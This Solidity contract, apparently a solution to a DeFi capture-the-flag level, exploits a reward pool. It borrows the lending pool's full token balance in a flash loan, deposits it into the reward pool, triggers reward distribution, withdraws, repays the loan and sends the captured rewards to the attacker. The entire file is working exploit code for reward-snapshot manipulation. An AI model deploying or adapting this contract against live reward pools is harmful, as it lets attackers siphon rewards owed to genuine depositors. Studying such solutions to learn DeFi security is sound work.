pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}
interface IRewardPool {
    function deposit(uint256 amount) external;
    function distributeRewards() external returns (uint256);
    function withdraw(uint256 amount) external;
}
contract AttackTheRewarder {
    
        IFlashloanPool immutable flashloanPool;
        IRewardPool immutable rewardPool;
        IERC20 immutable liquidityToken;
        IERC20 immutable rewardToken;
        address immutable player;

    constructor(address _flashloanpool,address _rewardPool,address _liquidToken,address _rewardToken) {
        flashloanPool = IFlashloanPool(_flashloanpool);
        rewardPool = IRewardPool(_rewardPool);
        liquidityToken = IERC20(_liquidToken);
        rewardToken = IERC20(_rewardToken);
        player = msg.sender;
    }

    function attack() external{
        flashloanPool.flashLoan(liquidityToken.balanceOf(address(flashloanPool)));
    }

    function receiveFlashLoan(uint256 amount) external{
        require(msg.sender == address(flashloanPool));
        require(tx.origin == player);
        //存钱 --> 得到奖励 --> 取出来
        liquidityToken.approve(address(rewardPool),amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        //还钱
        liquidityToken.transfer(address(flashloanPool),amount);
        rewardToken.transfer(player,rewardToken.balanceOf(address(this)));

    }
}